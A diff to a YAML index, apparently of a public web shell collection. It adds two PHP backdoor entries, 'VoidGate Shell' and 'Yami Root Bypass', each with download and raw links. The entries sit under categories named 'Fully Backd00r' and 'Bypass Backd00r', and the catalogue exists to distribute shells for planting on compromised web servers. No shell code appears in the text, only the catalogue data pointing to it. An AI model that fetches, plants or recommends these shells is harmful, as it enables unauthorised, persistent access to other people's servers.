@@ -234,6 +234,15 @@
   raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/me/ayanami.php"
 
 - category: "Fully Backd00r"
+  name: "VoidGate Shell"
+  image: "https://adilhyz.github.io/WebShell/preview/void.webp"
+  size: "30kb"
+  version: "-"
+  password: "-"
+  download: "https://adilhyz.github.io/WebShell/PHP/void.php"
+  raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/void.php"
+
+- category: "Fully Backd00r"
   name: "RBBD Shell"
   image: "https://adilhyz.github.io/WebShell/preview/rbbd.webp"
   size: "28kb"
@@ -331,6 +340,15 @@
   password: "-"
   download: "https://adilhyz.github.io/WebShell/PHP/403/yon03.php"
   raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/403/yon03.php"
+
+- category: "Bypass Backd00r"
+  name: "Yami Root Bypass"
+  image: "https://adilhyz.github.io/WebShell/preview/yami.webp"
+  size: "24kb"
+  version: "-"
+  password: "-"
+  download: "https://adilhyz.github.io/WebShell/PHP/403/yami.php"
+  raw: "https://raw.githubusercontent.com/adilhyz/WebShell/master/PHP/403/yami.php"
 
 - category: "Bypass Backd00r"
   name: "Zsec Mimetype Bypass"
